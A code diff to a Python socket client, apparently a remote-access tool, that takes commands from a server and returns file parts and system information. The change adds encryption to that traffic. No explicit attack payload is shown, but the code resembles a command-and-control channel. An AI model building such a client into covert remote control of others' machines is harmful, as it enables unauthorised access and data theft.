@@ -21,9 +21,10 @@ def send_response(client_socket, msg_type, msg):
 
     if msg_type == "filepart":
         response = msg
-        resp_len = str(len(response)).zfill(8).encode()
-        resp = resp_len + response
-        client_socket.send(resp)
+        enc_response = encryption.encrypt(response)
+        resp_len = str(len(enc_response)).zfill(8)
+        enc_resp = resp_len.encode() + enc_response
+        client_socket.sendall(enc_resp)
 
     else:
         if msg_type == "sys_info":
@@ -32,9 +33,10 @@ def send_response(client_socket, msg_type, msg):
             response = f"{msg_type} {msg}"
         else:
             response = f"{msg_type} {path} {msg}"
-        resp_len = str(len(response.encode())).zfill(8)
-        resp = resp_len + response
-        client_socket.send(resp.encode())
+        enc_response = encryption.encrypt(response)
+        resp_len = str(len(enc_response)).zfill(8)
+        enc_resp = resp_len.encode() + enc_response
+        client_socket.send(enc_resp)
 
 
 def handle_server_response(command, client_socket):
@@ -100,7 +102,7 @@ def main():
     command = ""
     while command != "exit 0":
         enc_command = client_socket.recv(1024)
-        command = encryption.decrypt(enc_command)
+        command = encryption.decrypt(enc_command).decode()
         if len(command.split()) >= 2:
             cmd_type, cmd = handle_server_response(command, client_socket)
         else:
